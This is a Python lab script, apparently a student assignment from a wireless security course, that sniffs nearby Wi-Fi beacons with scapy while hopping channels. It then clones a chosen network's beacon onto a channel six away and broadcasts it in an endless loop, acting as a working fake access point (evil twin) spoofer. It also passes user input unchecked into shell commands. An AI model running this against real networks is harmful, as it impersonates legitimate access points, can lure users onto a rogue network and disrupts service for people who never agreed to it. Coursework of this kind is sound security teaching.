#!/usr/bin/env python
'''
SWI - Labo1
Auteurs : Nemanja Pantic et David Simeonovic
But : Permet de sniffer les réseaux wifis ainsi que d'en copier un 
Source : https://www.shellvoide.com/python/how-to-code-a-simple-wireless-sniffer-in-python/
'''

import threading, os, time, random
from scapy.all import *

# Liste qui contient tous les wifis
networks = []

# Permet de configurer l'antenne pour qu'elle sniff sur tous les canaux
def hopper(iface):
    n = 1
    while True:
        time.sleep(0.50)
        os.system('iwconfig %s channel %d' % (iface, n))
        dig = int(random.random() * 14)
        if dig != 0 and dig != n:
            n = dig   

# Ajoute les wifis dans le tableaux
def findSSID(pkt):
    if pkt.haslayer(Dot11Beacon):
       if(pkt.info not in networks and len(pkt.info) > 0):
           networks.append(pkt)

# Demande à l'utilisateur le nom de l'interface avec laquelle il veut faire l'attaque
interface = input("Enter your interface name :")

# Lance un thread qui s'occupera de changer les canaux de l'antenne
thread = threading.Thread(target=hopper, args=(interface, ), name="hopper")
thread.daemon = True
thread.start()

# Lance le scan de wifi pendant 10 sec
print("Wait for scanning...")
sniff(iface=interface, prn=findSSID, timeout=10)

# Affichage du résultat du scan
print("Scan result :")
i = 0
for item in networks:
    print("{0} | {1} | {2} | {3} | {4}".format(
        i,
        item[Dot11].addr2, 
        item[Dot11Elt].info.decode(), 
        item.dBm_AntSignal, 
        item[Dot11Beacon].network_stats().get("channel")
    ))
    i+=1

# Demande à l'utilisateur quel wifi il voudrait copier
print("Choose a network to attack")
choosenAP = input()

# Récupération du SSID du wifi choisi par l'utilisateur
fakeSSID = networks[int(choosenAP)][Dot11Elt].info.decode()

# Récupère le canal du wifi choisi par l'utilisateur et y ajoute 6 pour avoir un écarts de 6 canaux
fakeChannel = networks[int(choosenAP)][Dot11Beacon].network_stats().get("channel")
fakeChannel = (fakeChannel + 6) % 13

# Récupération de paquet de base envoyé par l'AP
pkt = networks[int(choosenAP)]

# Récupération de la fin du paquet
payload = pkt.getlayer(6)

# Configuration de l'antenne pour qu'elle transmette sur le bon canal
os.system(f"iwconfig {interface} channel {fakeChannel}")

# Création du nouveau paquet à envoyer
newPacket = pkt
newPacket[Dot11Elt:3] = Dot11Elt(ID="DSset", info=chr(fakeChannel))
frame = newPacket/payload

# Envoie du nouveau paquet en boucle
print("Fake AP {0} on channel {1}".format(fakeSSID, fakeChannel))
sendp(frame, iface=interface, inter=0.1, loop=1)